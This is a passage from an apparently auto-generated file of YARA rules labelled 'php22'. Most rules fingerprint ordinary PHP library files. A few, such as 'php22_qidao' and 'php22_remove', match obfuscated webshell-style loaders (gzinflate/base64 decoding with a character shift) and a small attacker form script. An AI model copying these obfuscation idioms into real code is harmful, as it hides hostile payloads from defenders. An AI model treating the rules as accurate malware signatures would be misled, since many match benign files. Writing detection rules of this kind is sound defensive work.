      $s2 = "WP_CLI::error( sprintf( __( 'Component %s is already active', 'pods' ), $component ) );" fullword ascii
      $s3 = "* @subcommand import-pod" fullword ascii
      $s4 = "* @subcommand export-pod" fullword ascii
      $s5 = "* Implements PodsAPI command for WP-CLI" fullword ascii
      $s6 = "* @subcommand deactivate-component" fullword ascii
      $s7 = "* @subcommand activate-component" fullword ascii
      $s8 = "* @subcommand delete-pod" fullword ascii
      $s9 = "* @subcommand save-pod" fullword ascii
      $s10 = "* @subcommand reset-pod" fullword ascii
      $s11 = "* @subcommand add-pod" fullword ascii
      $s12 = "WP_CLI::add_command( 'pods-api', 'PodsAPI_CLI_Command' );" fullword ascii
      $s13 = "* @subcommand clear-cache" fullword ascii
      $s14 = "* @subcommand duplicate-pod" fullword ascii
      $s15 = "* @synopsis   --component=<component>" fullword ascii
      $s16 = "* @synopsis   --name=<name> --type=<type> --<field>=<value>" fullword ascii
      $s17 = "WP_CLI::error( __( 'Invalid package, Pod not imported', 'pods' ) );" fullword ascii
      $s18 = "* Deactivate a component" fullword ascii
      $s19 = "* Activate a component" fullword ascii
      $s20 = "WP_CLI::error( __( 'Error importing pod', 'pods' ) );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule OrderStageHelper
{
   meta:
      description = "php22 - file OrderStageHelper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "520fd3ebaab03aa7f06a8b037b833ee2bb8f3cda962933162830a01971745f9c"
   strings:
      $s1 = "public static function getPreviousButtons(OrderStage $stage)" fullword ascii
      $s2 = "public static function getNextButtons(OrderStage $stage)" fullword ascii
      $s3 = "if (0 === intval($item->stageFrom->immutable_by_user)) {" fullword ascii
      $s4 = "/** @var OrderStageLeaf $item */" fullword ascii
      $s5 = "'url' => Url::to(['/shop/cart/stage-leaf', 'id' => $item->id, 'previous' => 1], true)" fullword ascii
      $s6 = "use app\\modules\\shop\\models\\OrderStageLeaf;" fullword ascii
      $s7 = "use app\\modules\\shop\\models\\OrderStage;" fullword ascii
      $s8 = "'label' => \\Yii::t('app', 'Previous step')," fullword ascii
      $s9 = "namespace app\\modules\\shop\\helpers;" fullword ascii
      $s10 = "'url' => Url::to(['/shop/cart/stage-leaf', 'id' => $item->id], true)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule Request2
{
   meta:
      description = "php22 - file Request2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "92dafc3c22a2f9485769ae6ec87ed5d6276121efb3534f1ab1d71f0f799cd336"
   strings:
      $s1 = "$this->setHeader('user-agent', 'HTTP_Request2/2.0.0RC1 ' ." fullword ascii
      $s2 = "* @param HTTP_Request2_CookieJar|bool   Existing CookieJar object, true to" fullword ascii
      $s3 = "* Copyright (c) 2008-2011, Alexey Borzov <avb@php.net>" fullword ascii
      $s4 = "public function __construct($url = null, $method = self::METHOD_GET, array $config = array())" fullword ascii
      $s5 = "* @version    SVN: $Id: Request2.php 308735 2011-02-27 20:31:28Z avb $" fullword ascii
      $s6 = "* @param    string|array    header name, header string ('Header: value')" fullword ascii
      $s7 = "* @link       http://tools.ietf.org/html/rfc2616#section-5" fullword ascii
      $s8 = "* @param    string  content-type of file being uploaded" fullword ascii
      $s9 = "* @param    bool            whether to replace previous header with the" fullword ascii
      $s10 = "* @param    string|array|null header value if $name is not an array," fullword ascii
      $s11 = "*                           header will be removed if value is null" fullword ascii
      $s12 = "* @param    array               Configuration for this Request instance" fullword ascii
      $s13 = "* @link       http://pear.php.net/package/HTTP_Request2" fullword ascii
      $s14 = "if (empty($this->headers['content-type']) ||" fullword ascii
      $s15 = "* @param    string|resource|HTTP_Request2_MultipartBody  Either a string" fullword ascii
      $s16 = "* @param  string|resource file name or pointer to open file" fullword ascii
      $s17 = "* @param    mixed           parameter value if $nameOrConfig is not an array" fullword ascii
      $s18 = "* @param    string  password" fullword ascii
      $s19 = "* @param    string|array    configuration parameter name or array" fullword ascii
      $s20 = "'application/x-www-form-urlencoded' == $this->headers['content-type']" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule php22_picker
{
   meta:
      description = "php22 - file picker.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "888d374d9f981bfdb9d9fcfffa7c6d6cefadb178904a3ff96f42cab758699c01"
   strings:
      $s1 = "* This file is automatically generated by 'yii message' command." fullword ascii
      $s2 = "* Each array element represents the translation (value) of a message (key)." fullword ascii
      $s3 = "* enclosed between a pair of '@@' marks." fullword ascii
      $s4 = "* Messages that no longer need translation will have their translations" fullword ascii
      $s5 = "* You may modify this file by translating the extracted messages." fullword ascii
      $s6 = "* If the value is empty, the message is considered as not translated." fullword ascii
      $s7 = "* It contains the localizable messages extracted from source code." fullword ascii
      $s8 = "* NOTE: this file must be saved in UTF-8 encoding." fullword ascii
      $s9 = "* Message string can be used with plural forms format. Check i18n section" fullword ascii
      $s10 = "* of the guide for details." fullword ascii
      $s11 = "* Message translations." fullword ascii
      $s12 = "'Add {n,plural,=1{space} other{spaces}}' => ''," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule RequestInput
{
   meta:
      description = "php22 - file RequestInput.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8792bab04582e65d0532155b55568754c39c6290cd5f00bd4c8c1e02d9321a71"
   strings:
      $s1 = "* @author Aleksandr Sandrovskiy <a.sandrovsky@gmail.com>" fullword ascii
      $s2 = "* @param \\Symfony\\Component\\Console\\Input\\InputDefinition $definition" fullword ascii
      $s3 = "* RequestInput represents an input provided as an console request." fullword ascii
      $s4 = "foreach ($request->getParams() as $key => $param) {" fullword ascii
      $s5 = "* and is licensed under the MIT license." fullword ascii
      $s6 = "* @param \\Zend\\Console\\Request $request" fullword ascii
      $s7 = "public function __construct(Request $request, InputDefinition $definition = null)" fullword ascii
      $s8 = "use Symfony\\Component\\Console\\Input\\InputDefinition;" fullword ascii
      $s9 = "use Symfony\\Component\\Console\\Input\\ArgvInput;" fullword ascii
      $s10 = "namespace DoctrineModule\\Component\\Console\\Input;" fullword ascii
      $s11 = "* @license MIT" fullword ascii
      $s12 = "parent::__construct($parameters, $definition);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule OutputFormatTest
{
   meta:
      description = "php22 - file OutputFormatTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "152b3e1084d84ea5922a0f9332bbb0481615a47182876cdf8f716ba72da74b21"
   strings:
      $s1 = "* @expectedException Sabberworm\\CSS\\Parsing\\OutputException" fullword ascii
      $s2 = "@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render());" fullword ascii
      $s3 = "mat::create()->setSpaceAfterListArgumentSeparator(array('default' => ' ', ',' => \"\\t\", '/' => '', ' ' => ''))));" fullword ascii
      $s4 = "', $this->oDocument->render(OutputFormat::create()->set('Space*Rules', \"\\n\")->set('Space*Blocks', \"\\n\")));" fullword ascii
      $s5 = "$aBlocks = $this->oDocument->getAllDeclarationBlocks();" fullword ascii
      $s6 = "$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 \\'Helvetica\\',Verdana,sans-serif;background: white;}" fullword ascii
      $s7 = "#fff;}}', $this->oDocument->render(OutputFormat::create()->setSpaceAfterRuleName(\"\\t\")));" fullword ascii
      $s8 = "$this->assertSame($TEST_CSS, $this->oDocument->render(OutputFormat::createPretty()));" fullword ascii
      $s9 = "public function testSpaceAfterListArgumentSeparatorComplex() {" fullword ascii
      $s10 = "$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 \"Helvetica\",Verdana,sans-serif;background: white;}" fullword ascii
      $s11 = "$this->assertSame('.test {font: italic normal bold 16px/1.2 \"Helvetica\",Verdana,sans-serif;background: white;}" fullword ascii
      $s12 = "$this->assertSame('.main, .test{font: italic normal bold 16px/1.2 \"Helvetica\",Verdana,sans-serif;background: white;}" fullword ascii
      $s13 = "$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 \"Helvetica\",Verdana,sans-serif;background: white}" fullword ascii
      $s14 = "}}', $this->oDocument->render(OutputFormat::create()->set('Space*Rules', \"\\n\")));" fullword ascii
      $s15 = "', $this->oDocument->render(OutputFormat::create()->set('Space*Blocks', \"\\n\")));" fullword ascii
      $s16 = "er(OutputFormat::create()->setRGBHashNotation(false)));" fullword ascii
      $s17 = "$this->oDocument->render(OutputFormat::create()->setIgnoreExceptions(false));" fullword ascii
      $s18 = ".main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}" fullword ascii
      $s19 = ".main, .test {font: italic normal bold 16px/1.2 \"Helvetica\",Verdana,sans-serif;background: white;}" fullword ascii
      $s20 = "ormat::create()->setSpaceAfterListArgumentSeparator(\"  \")));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}


rule php22_remove
{
   meta:
      description = "php22 - file remove.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a6c7dbf0960fd531a64b22f1cc3777446776eb5027f10618e6edd1c26b47c918"
   strings:
      $s1 = "<textarea name=\"res7ock\" cols='50' rows='12' placeholder=\"Input Your Text\"></textarea><br><br>" fullword ascii
      $s2 = "error_reporting(E_ALL ^ ( E_NOTICE | E_WARNING ));" fullword ascii
      $s3 = "echo \"<center><textarea  cols='50' rows='12'>\".implode ($hasil,\"\\n\").\"</textarea>\";" fullword ascii
      $s4 = "<form name=\"data\" method=\"post\">" fullword ascii
      $s5 = "$co=$_POST['res7ock'];" fullword ascii
      $s6 = "$ya=$_POST['res'];" fullword ascii
      $s7 = "<input type=\"submit\" name='res' value=\"GASCOK\">" fullword ascii
   condition:
      uint16(0) == 0x663c and filesize < 1KB and
      all of them
}

rule PostgresqlTest
{
   meta:
      description = "php22 - file PostgresqlTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a43a55658022867f229f299ce50f7165409d81923c56c65b896e10fcd5320ae0"
   strings:
      $x1 = "* through the world-wide-web, please send an email to license@phalconphp.com" fullword ascii
      $s2 = "* @author Serghei Iakovlev <serghei@phalconphp.com>" fullword ascii
      $s3 = "* @link      https://phalconphp.com" fullword ascii
      $s4 = "* Tests the \\Phalcon\\Db\\Dialect\\Postgresql component" fullword ascii
      $s5 = "* @author    Andres Gutierrez <andres@phalconphp.com>" fullword ascii
      $s6 = "* @author    Serghei Iakovlev <serghei@phalconphp.com>" fullword ascii
      $s7 = "* Tests Postgresql::dropPrimaryKey" fullword ascii
      $s8 = "* Tests Postgresql::dropForeignKey" fullword ascii
      $s9 = "* bundled with this package in the file LICENSE.txt" fullword ascii
      $s10 = "* Tests Postgresql::supportsReleaseSavepoints" fullword ascii
      $s11 = "* The contents of this file are subject to the New BSD License that is" fullword ascii
      $s12 = "* Tests Postgresql::addPrimaryKey" fullword ascii
      $s13 = "* Tests Postgresql::addForeignKey" fullword ascii
      $s14 = "* Tests Postgresql::supportsSavepoints" fullword ascii
      $s15 = "* \\Phalcon\\Test\\Unit\\Db\\Dialect\\PostgresqlTest" fullword ascii
      $s16 = "* Tests Postgresql::dropView" fullword ascii
      $s17 = "* Tests Postgresql::dropIndex" fullword ascii
      $s18 = "* Tests Postgresql::dropTable" fullword ascii
      $s19 = "* Tests Postgresql::dropColumn" fullword ascii
      $s20 = "* Tests Postgresql::describeReferences" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule PathsEvent
{
   meta:
      description = "php22 - file PathsEvent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8f9a0aaf0c76feaf32ee8df475d03a2620fddab5048714117e20be467a455cfe"
   strings:
      $s1 = "public function getPaths(): array" fullword ascii
      $s2 = "use Symfony\\Component\\EventDispatcher\\Event;" fullword ascii
      $s3 = "$this->paths = array_merge($this->paths, $paths);" fullword ascii
      $s4 = "namespace Pimcore\\Event\\BundleManager;" fullword ascii
      $s5 = "$this->paths = array_unique($this->paths);" fullword ascii
      $s6 = "public function __construct(array $paths = [])" fullword ascii
      $s7 = "public function setPaths(array $paths)" fullword ascii
      $s8 = "public function addPaths(array $paths)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule PromotionActionFactorySpec
{
   meta:
      description = "php22 - file PromotionActionFactorySpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6756431825fe2124fa53ef8c729ed87f926c01f34a530d0a03ee9c4fb8d71489"
   strings:
      $s1 = "use Sylius\\Component\\Core\\Promotion\\Action\\ShippingPercentageDiscountPromotionActionCommand;" fullword ascii
      $s2 = "use Sylius\\Component\\Core\\Promotion\\Action\\UnitPercentageDiscountPromotionActionCommand;" fullword ascii
      $s3 = "use Sylius\\Component\\Core\\Promotion\\Action\\UnitFixedDiscountPromotionActionCommand;" fullword ascii
      $s4 = "use Sylius\\Component\\Core\\Promotion\\Action\\PercentageDiscountPromotionActionCommand;" fullword ascii
      $s5 = "use Sylius\\Component\\Core\\Promotion\\Action\\FixedDiscountPromotionActionCommand;" fullword ascii
      $s6 = "$promotionAction->setType(ShippingPercentageDiscountPromotionActionCommand::TYPE)->shouldBeCalled();" fullword ascii
      $s7 = "$promotionAction->setType(UnitPercentageDiscountPromotionActionCommand::TYPE)->shouldBeCalled();" fullword ascii
      $s8 = "$promotionAction->setType(PercentageDiscountPromotionActionCommand::TYPE)->shouldBeCalled();" fullword ascii
      $s9 = "$promotionAction->setType(UnitFixedDiscountPromotionActionCommand::TYPE)->shouldBeCalled();" fullword ascii
      $s10 = "$promotionAction->setType(FixedDiscountPromotionActionCommand::TYPE)->shouldBeCalled();" fullword ascii
      $s11 = "use Sylius\\Component\\Promotion\\Model\\PromotionActionInterface;" fullword ascii
      $s12 = "use Sylius\\Component\\Core\\Factory\\PromotionActionFactoryInterface;" fullword ascii
      $s13 = "function it_creates_an_unit_percentage_discount_action_with_given_a_discount_rate(" fullword ascii
      $s14 = "function it_creates_a_shipping_percentage_discount_action_with_a_given_discount_rate(" fullword ascii
      $s15 = "use Sylius\\Component\\Resource\\Factory\\FactoryInterface;" fullword ascii
      $s16 = "$this->createUnitPercentageDiscount(0.1, 'WEB_US')->shouldReturn($promotionAction);" fullword ascii
      $s17 = "$promotionAction->setConfiguration(['WEB_US' => ['percentage' => 0.1]])->shouldBeCalled();" fullword ascii
      $s18 = "$this->createShippingPercentageDiscount(0.1)->shouldReturn($promotionAction);" fullword ascii
      $s19 = "namespace spec\\Sylius\\Component\\Core\\Factory;" fullword ascii
      $s20 = "function it_creates_a_percentage_discount_action_with_a_given_discount_rate(" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule PropertyMeta
{
   meta:
      description = "php22 - file PropertyMeta.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "95b00387d288020c1e5b4b5d12ca97c71a9eafa5befca5ff0cc39811b044780c"
   strings:
      $s1 = "public function __construct($name, $type=null, $isOptional=false,$default=null, $validation=null, $summary='', $description=" fullword ascii
      $s2 = "* [*.num, \"in:0,1,2\"]" fullword ascii
      $s3 = "* @param TypeContainerInterface|null $container" fullword ascii
      $s4 = "* @var TypeContainerInterface|null" fullword ascii
      $s5 = "* PropertyMeta constructor." fullword ascii
      $s6 = "* @param string $validation" fullword ascii
      $s7 = "* @param boolean $isOptional" fullword ascii
      $s8 = "* @param mixed|null $default" fullword ascii
      $s9 = "* @var array|string" fullword ascii
      $s10 = "* \"in:0,1,2\"" fullword ascii
      $s11 = "public $description='';" fullword ascii
      $s12 = "use PhpBoot\\Entity\\TypeContainerInterface;" fullword ascii
      $s13 = "$this->isOptional = $isOptional;" fullword ascii
      $s14 = "use PhpBoot\\Entity\\EntityContainer;" fullword ascii
      $s15 = "use PhpBoot\\Entity\\ArrayContainer;" fullword ascii
      $s16 = "$this->validation = $validation;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule RequestResolverInterface
{
   meta:
      description = "php22 - file RequestResolverInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "46f6d54be1759957693aeeee1b9d3a4b17065e09fac3dbd59342849c83e62298"
   strings:
      $s1 = "* @param Request $request" fullword ascii
      $s2 = "* @return ChannelInterface|null" fullword ascii
      $s3 = "namespace Sylius\\Component\\Channel\\Context\\RequestBased;" fullword ascii
      $s4 = "use Sylius\\Component\\Channel\\Model\\ChannelInterface;" fullword ascii
      $s5 = "public function findChannel(Request $request): ?ChannelInterface;" fullword ascii
      $s6 = "interface RequestResolverInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule publishButton
{
   meta:
      description = "php22 - file publishButton.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c21852fe586d3ab1132037bbf41b9e5c798d1ab3fccdb948a783adee44d9d2f7"
   strings:
      $s1 = "<strong><?php echo (int)$revision['revisionId']; ?></strong> - <?php echo ipFormatDateTime(strtotime($revisi" fullword ascii
      $s2 = "on['createdAt']), 'Ip-admin'); echo $revision['isPublished'] ? ' '.esc(__('Published', 'Ip-admin')) . ' ' : ''; ?>" fullword ascii
      $s3 = "<li class=\"_button\"><button type=\"button\" class=\"btn <?php echo $button2Class ?>  btn-block <?php echo $button2Action ?>" fullword ascii
      $s4 = "<strong><?php echo (int)$revision['revisionId']; ?></strong> - <?php echo ipFormatDateTime(strtotime($revision['createdAt']), 'I" ascii
      $s5 = "<?php foreach ($revisions as $revisionKey => $revision){" fullword ascii
      $s6 = "<a href=\"<?php echo $managementUrls[$revisionKey]; ?>\">" fullword ascii
      $s7 = "$button2Action = 'ipsContentSave';" fullword ascii
      $s8 = "$button2Action = 'ipsContentPublish';" fullword ascii
      $s9 = "$buttonAction = 'ipsContentPublish';" fullword ascii
      $s10 = "$buttonAction = 'ipsContentSave';" fullword ascii
      $s11 = "if ($revision['revisionId'] == $currentRevision['revisionId']) {" fullword ascii
      $s12 = "<div class=\"ipModuleContentPublishButton btn-group\">" fullword ascii
      $s13 = "\"><?php echo esc($button2Text) ?></button></li>" fullword ascii
      $s14 = "$buttonText = __('Published', 'Ip-admin', false);" fullword ascii
      $s15 = "$button2Text = __('Publish', 'Ip-admin', false);" fullword ascii
      $s16 = "if (!$isVisible && ipIsManagementState()) {" fullword ascii
      $s17 = "<li<?php echo $revisionClass ? ' class=\"'.$revisionClass.'\"' : ''; ?>>" fullword ascii
      $s18 = "$buttonText = __('Publish', 'Ip-admin', false);" fullword ascii
      $s19 = "$buttonText = __('Save', 'Ip-admin', false);" fullword ascii
      $s20 = "$button2Text = __('Save', 'Ip-admin', false);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule php22_Phpdbg
{
   meta:
      description = "php22 - file Phpdbg.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b1f4fdc56f54755af6051f3caec79c414dfee6559da00c3d5920ba854d6b09bc"
   strings:
      $s1 = "* @param array $config The options array, possible options are:" fullword ascii
      $s2 = "*                      - `'coverage'` _integer_: the code coverage mask." fullword ascii
      $s3 = "*                      - `'cleanup'`  _boolean_: indicated if the coverage should be flushed on stop." fullword ascii
      $s4 = "$result[$file][$line - 1] = $value <= 0 ? 0 : 1;" fullword ascii
      $s5 = "* Config array" fullword ascii
      $s6 = "* The Constructor." fullword ascii
      $s7 = "* @return array The collected coverage" fullword ascii
      $s8 = "namespace Kahlan\\Reporter\\Coverage\\Driver;" fullword ascii
      $s9 = "throw new RuntimeException('PHPDBG SAPI has not been detected.');" fullword ascii
      $s10 = "* Stops code coverage." fullword ascii
      $s11 = "* Starts code coverage." fullword ascii
      $s12 = "public function __construct($config = [])" fullword ascii
      $s13 = "$data = phpdbg_end_oplog();" fullword ascii
      $s14 = "phpdbg_start_oplog();" fullword ascii
      $s15 = "protected $_config = [];" fullword ascii
      $s16 = "foreach ($coverage as $line => $value) {" fullword ascii
      $s17 = "use RuntimeException;" fullword ascii
      $s18 = "foreach ($data as $file => $coverage) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule requestMembershipSave
{
   meta:
      description = "php22 - file requestMembershipSave.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ebf22a7440fc2958a10ed0f31bec61ec51b604b57197d5f60fb63ab21ef712fb"
   strings:
      $s1 = "<?php echo CHtml::link(Yii::t('SpaceModule.widgets_views_requestMembershipSave', 'Close'), '#', array('onclick'=>'re" fullword ascii
      $s2 = "<h2><?php echo Yii::t('SpaceModule.widgets_views_requestMembershipSave', 'Request workspace membership'); ?></h2>" fullword ascii
      $s3 = "<?php echo Yii::t('SpaceModule.widgets_views_requestMembershipSave', 'Your request was successfully submitted to" fullword ascii
      $s4 = "window.location.href = \"<?php Yii::app()->createUrl('workspace/publicShow', array('guid' => $workspace->guid)); ?>\"  ;" fullword ascii
      $s5 = "* Refresh the current page" fullword ascii
      $s6 = "direct();//RequestWorkspacebox.close()', 'class' => 'button', 'style' => 'color: #fff;')); ?>" fullword ascii
      $s7 = "<div class=\"content content_innershadow\">" fullword ascii
      $s8 = "jQuery('#close_button_requestWorkspace').remove();" fullword ascii
      $s9 = "the workspace administrators.'); ?><br/>" fullword ascii
      $s10 = "<?php echo Yii::t('SpaceModule.widgets_views_requestMembershipSave', 'Your request was successfully submitted to the workspace a" ascii
      $s11 = "<div id=\"lightbox_requestWorkspace\">" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 3KB and
      8 of them
}

rule profile_fields
{
   meta:
      description = "php22 - file profile_fields.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e4a31a471378e08f70f0421480f849b386a582ed98e8209bb86a42e03eb86bbb"
   strings:
      $s1 = "* Admin area: edit default profile fields" fullword ascii
      $s2 = "echo elgg_view('admin/configure_utilities/profile_fields/list');" fullword ascii
      $s3 = "elgg_require_js('admin/configure_utilities/profile_fields');" fullword ascii
      $s4 = "'confirm' => elgg_echo('profile:resetdefault:confirm')," fullword ascii
      $s5 = "'value' => elgg_echo('profile:explainchangefields')," fullword ascii
      $s6 = "'href' => 'ajax/form/profile/fields/add'," fullword ascii
      $s7 = "'title' => elgg_echo('profile:resetdefault')," fullword ascii
      $s8 = "'href' => 'action/profile/fields/reset'," fullword ascii
      $s9 = "echo elgg_view('output/longtext', [" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule progressBar
{
   meta:
      description = "php22 - file progressBar.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2df2b87fddb5875eb4305a8591022c4a585578206779de05094d51713506eae7"
   strings:
      $s1 = "$this->progressBar = '[' . (($this->iterations - $this->currentIteration) > (self::width - 1) ? str_repeat('.', " fullword ascii
      $s2 = "if ($this->iterations > self::width && $this->iterations - $this->currentIteration && $this->currentIteration % (sel" fullword ascii
      $s3 = "$string .= str_repeat(\"\\010\", (strlen($this->progressBar) - $refreshLength) + strlen($this->counter));" fullword ascii
      $s4 = "h - 1) . '>' : str_pad(str_repeat('.', $this->iterations), self::width, '_', STR_PAD_RIGHT)));" fullword ascii
      $s5 = "$this->progressBar = $this->refresh . substr($this->progressBar, $refreshLength + 1);" fullword ascii
      $s6 = "$this->progressBar = substr($this->progressBar, 0, $this->currentIteration) . $this->refresh . substr($this->pro" fullword ascii
      $s7 = "$this->progressBar = sprintf($this->progressBarFormat, ($this->iterations > self::width ? str_repeat('.', self::widt" fullword ascii
      $s8 = "$this->counter = sprintf($this->counterFormat, sprintf('%' . strlen((string) $this->iterations) . 'd', $this->curren" fullword ascii
      $s9 = "f::width - 1) == 0) {" fullword ascii
      $s10 = "if ($this->iterations > 0 && $this->currentIteration < $this->iterations) {" fullword ascii
      $s11 = "const defaultProgressBarFormat = '[%s]';" fullword ascii
      $s12 = "gressBar, $this->currentIteration + 1);" fullword ascii
      $s13 = "public function __construct($iterations = 0, atoum\\cli $cli = null)" fullword ascii
      $s14 = "public function getCli()" fullword ascii
      $s15 = "self::width - 1) . '>' : str_pad(str_repeat('.', $this->iterations - $this->currentIteration), self::width, '_', STR_PAD_RIGHT))" ascii
      $s16 = "$this->progressBar = sprintf($this->progressBarFormat, ($this->iterations > self::width ? str_repeat('.', self::width - 1) . '>'" ascii
      $s17 = "if ($this->iterations > self::width && $this->iterations - $this->currentIteration && $this->currentIteration % (self::width - 1" ascii
      $s18 = "$this->progressBar = '[' . (($this->iterations - $this->currentIteration) > (self::width - 1) ? str_repeat('.', self::width - 1)" ascii
      $s19 = "$this->progressBarFormat = self::defaultProgressBarFormat;" fullword ascii
      $s20 = "if ($this->progressBar === null && $this->counter === null) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule php22_qidao
{
   meta:
      description = "php22 - file qidao.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f97a1f0a6634f6b0735ede9988573b2a4d1d788603410d76918d3b89393a612f"
   strings:
      $s1 = "$nsz=gzinflate(base64_decode($nsz));" fullword ascii
      $s2 = "8Kg0tfQ2YWVoauooaSampGlo2ig72AA==\"));?>" fullword ascii
      $s3 = "$nsz[$i] = chr(ord($nsz[$i])-1);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule permissions_access
{
   meta:
      description = "php22 - file permissions_access.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8e5a993e034f41f609580c41ee3e3e9fc5ea2162a61aa314be5ad63c8930d236"
   strings:
      $s1 = "if ($_REQUEST['task'] == 'get_all_access_entities' && $pcnt > 0 && $permissionsInherit == 'OVERRIDE') {" fullword ascii
      $s2 = "<option value=\"<?=$pk->getPermissionKeyID()?>\"><?=$pk->getPermissionKeyDisplayName()?></option>" fullword ascii
      $s3 = "$searchInstance = Loader::helper('text')->entities($_REQUEST['searchInstance']);" fullword ascii
      $s4 = "$('.ccm-permission-grid-cell-value').attr('id', 'ccm-permission-grid-cell-' + $(this).val());" fullword ascii
      $s5 = "jQuery.fn.dialog.showLoader();" fullword ascii
      $s6 = "jQuery.fn.dialog.hideLoader();" fullword ascii
      $s7 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s8 = "if ($as->getAccessType() == PermissionKey::ACCESS_TYPE_EXCLUDE) {" fullword ascii
      $s9 = "$listItems = $pa->getAccessListItems(PermissionKey::ACCESS_TYPE_ALL);" fullword ascii
      $s10 = "$sh = Loader::helper('concrete/dashboard/sitemap');" fullword ascii
      $s11 = "\" /> <span class=\"label ' . $class . '\" ' . $pdTitle . '>' . $entity->getAccessEntityLabel() . '</span></label>';" fullword ascii
      $s12 = "echo '<label class=\"checkbox\"><input type=\"checkbox\" name=\"listItem[]\" value=\"' . $entity->getAccessEntityID() ." fullword ascii
      $s13 = "$pk = PermissionKey::getByID($_REQUEST['pkID']);" fullword ascii
      $s14 = "$permissions = PermissionKey::getList('page');" fullword ascii
      $s15 = "tities<?=$cIDStr?>&pkID=' + $(this).val(), function() {" fullword ascii
      $s16 = "<button class=\"btn\" type=\"button\" onclick=\"jQuery.fn.dialog.closeTop()\"><?=t('Cancel')?></button>" fullword ascii
      $s17 = "$form = Loader::helper('form');" fullword ascii
      $s18 = "$aepdID = $entity->getAccessEntityID() . $as->getAccessType();" fullword ascii
      $s19 = "$('#ccm-permissions-bulk-access-remove').load('<?=REL_DIR_FILES_TOOLS_REQUIRED?>/pages/permissions_access?task=get_all_access_en" ascii
      $s20 = "$permissionsInherit[] = $_c->getCollectionInheritance();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule parsecsv_lib
{
   meta:
      description = "php22 - file parsecsv.lib.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9a0c3284c508462e9eb3de0c38ba852d5b9c5c7e184daf4e819e7d484e1b6735"
   strings:
      $x1 = "- http://minghong.blogspot.com/2006/07/csv-parser-for-php.html" fullword ascii
      $s2 = "#  - only recommended when you know the extact sctructure of the file" fullword ascii
      $s3 = "* @return  Processed value" fullword ascii
      $s4 = "* @param   current_row   the current row number being processed" fullword ascii
      $s5 = "$csv->data[4] = array('firstname' => 'John', 'lastname' => 'Doe', 'email' => 'john@doe.com');" fullword ascii
      $s6 = "* @param   append   append current data to end of target CSV if exists" fullword ascii
      $s7 = "* @param   filename    if specified, headers and data will be output directly to browser as a downloable file" fullword ascii
      $s8 = "} elseif ( empty($this->fields) || (!empty($this->fields) && (($this->heading && $row_count > 0) || !$this->heading)) ) {" fullword ascii
      $s9 = "- http://en.wikipedia.org/wiki/Comma-separated_values" fullword ascii
      $s10 = "# number of rows to analyze when attempting to auto-detect delimiter" fullword ascii
      $s11 = "header('Content-Disposition: attachment; filename=\"'.$filename.'\"');" fullword ascii
      $s12 = "* - set these options with $object->var_name = 'value';" fullword ascii
      $s13 = "# characters to ignore when attempting to auto-detect delimiter" fullword ascii
      $s14 = "* @param   value   string to process" fullword ascii
      $s15 = "http://code.google.com/p/parsecsv-for-php/" fullword ascii
      $s16 = "return $pref.$match.'.'.(99999 - str_pad($first, 5, '0', STR_PAD_LEFT));" fullword ascii
      $s17 = "* Auto-Detect Delimiter: Find delimiter by analyzing a specific number of" fullword ascii
      $s18 = "#  0 = No errors found. Everything should be fine :)" fullword ascii
      $s19 = "* Validates if the row is within the offset or not if sorting is disabled" fullword ascii
      $s20 = "* @return  2D array with CSV data, or false on failure" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule PostTypeException
{
   meta:
